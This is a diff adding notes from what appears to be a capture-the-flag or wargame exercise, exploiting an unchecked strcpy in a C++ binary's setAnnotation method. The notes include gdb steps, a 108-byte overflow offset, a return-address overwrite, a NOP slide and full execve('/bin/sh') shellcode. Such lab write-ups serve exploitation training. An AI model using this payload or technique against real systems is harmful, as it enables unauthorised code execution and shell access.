@@ -1,0 +1,44 @@
+disas _ZN1N13setAnnotationEPc
+
+we can see that there is an strcpy from our av[1] to a location
+
+there is no check for the strcpy so we can make it segfault
+
+if we segfault (with more than 108 character )
+we can see that we overwrite EAX and the stack
+
+It then  0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
+
+load what is at address [eax] into edx
+
+it then call edx later.
+
+If we can control eax we can call whatever we want.
+
+
+we can exploit like this "A" * 108 + <new EAX addr> + what we can to execute
+
+
+b*   0x08048693 <+159>:	call   edx
+
+(gdb) run $(python -c 'print "A" * 108')
+
+info registers
+x/20wx $esp
+
+we can see that esp is starting at 0804a078
+
+so if we do not overwrite that's where we appear on stack at this moment
+
+lets write to this addr
+
+\x90 is just NOP slide
+https://c9x.me/x86/html/file_module_x86_id_217.html
+it does nothing
+since stack maaybe be variable i sometime use this
+
+then there is just a shell code who call system('/bin/sh');
+
+$(python -c 'print "A" * 108 +"\x78\xa0\x04\x08" + "\x90" *
+100+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
+
